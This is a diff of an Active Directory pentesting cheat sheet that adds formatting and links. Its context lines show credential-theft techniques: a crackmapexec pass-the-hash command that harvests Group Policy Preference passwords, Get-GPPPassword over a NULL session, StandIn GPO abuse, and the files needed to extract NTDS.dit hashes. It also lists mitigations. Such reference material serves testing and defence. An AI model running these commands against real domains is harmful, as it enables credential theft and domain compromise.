@@ -665,8 +665,8 @@ Requirements:
 
 | Error  | Message             | Debug                                    |
 |--------|---------------------|------------------------------------------|
-| 0x5    | rpc_s_access_denied | Permissions on the file in the SMB share |
-| 0x525  | ERROR_NO_SUCH_USER  | The specified account does not exist.    |
+| 0x5    | `rpc_s_access_denied` | Permissions on the file in the SMB share |
+| 0x525  | `ERROR_NO_SUCH_USER`  | The specified account does not exist.    |
 | 0x180  | unknown error code  | Share is not SMB2                        |
 
 
@@ -844,7 +844,7 @@ echo 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aS
     cme smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_password
     ```
 
-* [Get-GPPPassword](https://github.com/ShutdownRepo/Get-GPPPassword)
+* [Get-GPPPassword](https://github.com/SecureAuthCorp/impacket/blob/master/examples/Get-GPPPassword.py)
   ```powershell
   # with a NULL session
   Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'
@@ -858,7 +858,7 @@ echo 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aS
 
 #### Mitigations
 
-* Install KB2962486 on every computer used to manage GPOs which prevents new credentials from being placed in Group Policy Preferences.
+* Install [KB2962486](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2014/ms14-025) on every computer used to manage GPOs which prevents new credentials from being placed in Group Policy Preferences.
 * Delete existing GPP xml files in SYSVOL containing passwords.
 * Don’t put passwords in files that are accessible by all authenticated users.
 
@@ -968,7 +968,7 @@ StandIn.exe --gpo --filter Shards --tasktype computer --taskname Liber --author 
 
 You will need the following files to extract the ntds : 
 - NTDS.dit file
-- SYSTEM hive (C:\Windows\System32\SYSTEM)
+- SYSTEM hive (`C:\Windows\System32\SYSTEM`)
 
 Usually you can find the ntds in two locations : `systemroot\NTDS\ntds.dit` and `systemroot\System32\ntds.dit`.
 - `systemroot\NTDS\ntds.dit` stores the database that is in use on a domain controller. It contains the values for the domain and a replica of the values for the forest (the Configuration container data).
